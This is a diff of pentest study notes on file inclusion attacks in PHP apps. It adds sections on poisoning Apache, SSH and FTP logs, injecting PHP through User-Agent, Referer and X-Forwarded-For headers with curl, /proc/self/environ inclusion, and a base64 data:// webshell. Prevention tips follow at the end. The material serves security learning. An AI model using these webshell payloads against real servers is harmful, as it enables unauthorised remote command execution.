@@ -1,10 +1,14 @@
-# Local File Inclusion (LFI) &&
+---
+description: Server-Side Attacks
+---
+
+# LFI && LFD && RFI
 
 
 
 ### Mechanism of Exploitation
 
-LFI vulnerabilities commonly manifest in templating engines used across web applications. These engines facilitate uniformity in appearance by loading static elements like headers, navigation bars, and footers from shared templates. Dynamic content, specified via parameters in URLs such as **`/`**<mark style="color:blue;">**`index.php?page=about`**</mark>, is then loaded separately without needing modification to every page for static changes. Exploiting this setup involves manipulating the parameter (`about` in this case) to retrieve and display unintended files, potentially exposing sensitive information.
+LFI vulnerabilities commonly manifest in templating engines used across web applications. These engines facilitate uniformity in appearance by loading static elements like headers, navigation bars, and footers from shared templates. Dynamic content, specified via parameters in URLs such as **/**<mark style="color:red;">**index.php?page=abou**</mark><mark style="color:red;">t</mark> is then loaded separately without needing modification to every page for static changes. Exploiting this setup involves manipulating the parameter (`about` in this case) to retrieve and display unintended files, potentially exposing sensitive information.
 
 *   Implications of LFI
 
@@ -378,6 +382,165 @@ Shell
 ```php
 http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
 ```
+
+## Poisoning
+
+### Log File poisoning
+
+This is a technique where an attacker injects malicious code into log files on the server, including via the LFI vulnerability. Since log files often record user input \
+(such as <mark style="color:red;">**User-Agent**</mark> strings or <mark style="color:red;">**GET/POST parameters**</mark>, <mark style="color:red;">SSH login</mark>/ <mark style="color:red;">**FTP Login**</mark>, <mark style="color:red;">Apache</mark> <mark style="color:red;"></mark><mark style="color:red;">**Log**</mark>), an attacker can manipulate these inputs to inject PHP code.
+
+Steps:Inject malicious code (usually PHP) into a log file
+
+```php
+GET /index.php?page=../../../../var/log/apache2/access.log HTTP/1.1
+Host: vulnerable-website.com
+User-Agent: <?php system($_GET['cmd']); ?>
+```
+
+Once  the log file eis poisoned&#x20;
+
+{% code overflow="wrap" %}
+```
+http://vulnerable-website.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
+```
+{% endcode %}
+
+**Files Commonly Targeted for Log Poisoning:**
+
+* Web server access/error logs (`/var/log/apache2/access.log`, `/var/log/httpd/access.log`).
+* Mail logs (`/var/log/mail.log`).
+* User logins (`/var/log/auth.log`).
+
+<figure><img src="../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>
+
+### SSH Login Log Poisoning
+
+**Step 1:** Connect to the server via SSH and input malicious PHP code as the username or password. For example:
+
+```bash
+ssh  '<?php system($_GET["cmd"]); ?>'@target.com
+```
+
+
+
+go to the auth.log file or secure
+
+{% code overflow="wrap" %}
+```bash
+http://vulnerable-website.com/index.php?page=../../../../var/log/auth.log&cmd=id
+```
+{% endcode %}
+
+### **LFI via FTP Login Log Poisoning**
+
+step1; connect to the FTP
+
+```bash
+ftp target.com
+Name: <?php system($_GET["cmd"]); ?>
+```
+
+The login will fail, but the attempt is logged in the FTP log files (e.g., `/var/log/vsftpd.log` or `/var/log/xferlog`).
+
+**Step 2:** Use the LFI vulnerability to include the FTP log file:
+
+{% code overflow="wrap" %}
+```bash
+bashCopy codehttp://vulnerable-website.com/index.php?page=../../../../var/log/vsftpd.log&cmd=id
+```
+{% endcode %}
+
+## Inject Commands  (Metadata)
+
+we will cover adding commands to the metadata by manipulating HTTP Headers like
+
+(<mark style="color:red;">**User-Agent, Referer. X-Forwarded-For**</mark>)
+
+using  Curl to manipulate the User-Agent
+
+```bash
+curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/
+```
+
+**-A => User-Agent**
+
+**-e => Referer**
+
+**-H => X-Forwarded-for**
+
+1.  **User-Agent Header Injection:**
+
+    {% code overflow="wrap" %}
+    ```bash
+    curl -A '<?php system($_GET["cmd"]); ?>' http://vulnerable-website.com/
+    ```
+    {% endcode %}
+2.  **Referer Header Injection:**
+
+    ```bash
+    curl -e '<?php system($_GET["cmd"]); ?>' http://vulnerable-website.com/
+    ```
+3.  **X-Forwarded-For Header Injection:**
+
+    ```bash
+    curl -H "X-Forwarded-For: <?php system($_GET['cmd']); ?>" http://vulnerable-website.com/
+    ```
+
+Executing Commands via LFI
+
+```bash
+index.php?page=../../../../var/log/apache2/access.log&cmd=ls
+```
+
+## Exploit Steps for LFI via `/proc/self/environ`
+
+```bash
+curl -A '<?php system($_GET["cmd"]); ?>' http://vulnerable-website.com/
+```
+
+* **`-A`** sets the `User-Agent` header.
+* The malicious payload `<?php system($_GET["cmd"]); ?>` is now part of the environment variable associated with `User-Agent`.
+
+**2. Using LFI to Include `/proc/self/environ`**
+
+Once the PHP code is injected into the environment, you can use the LFI vulnerability to include the `/proc/self/environ` file.
+
+```bash
+index.php?page=../../../../proc/self/environ&cmd=id
+```
+
+#### Data Wrapper (`data://`)
+
+The `data://` wrapper allows inclusion of data directly into PHP scripts, making it ideal for injecting PHP code snippets and executing them on the server.
+
+RCE via `data://`
+
+{% code overflow="wrap" %}
+```php
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id"
+```
+{% endcode %}
+
+In this example:
+
+* We encode our PHP payload (**`<?php system($_GET["cmd"]); ?>`**) in Base64.
+* We pass it using `data://` and specify `text/plain;base64` as the content type.
+
+Mitigation
+
+**Disable Dangerous Wrappers**: Disable the **`data`**`://` wrapper by ensuring **`allow_url_include=Off`** in `php.ini`
+
+## Preventing and Mitigating File Inclusion Vulnerabilities
+
+## Preventing
+
+1. input validation
+2. Avoid Using User-Controllablelike (<mark style="color:red;">**include**</mark>, <mark style="color:red;">**require**</mark>, <mark style="color:red;">**file\_get\_contents**</mark>)
+3. file Permission
+4. config Hardening disable (<mark style="color:red;">**allow\_url\_fopen**</mark>, <mark style="color:red;">**alow\_url\_include**</mark>)
 
 #### Mitigation Techniques:
 
